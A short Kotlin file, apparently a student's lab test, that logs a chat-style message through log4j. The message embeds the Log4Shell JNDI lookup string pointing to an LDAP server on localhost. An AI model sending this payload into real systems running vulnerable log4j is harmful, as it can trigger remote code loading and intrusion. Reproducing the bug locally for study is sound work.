package STUD.LiuZheng

import org.apache.log4j.LogManager


fun main() {
    val logger = LogManager.getLogger(object {}::class.java)
    logger.error(" <SomeStevePlayer> Hello  \${jndi:ldap://127.0.0.1:9090/log/test}")
}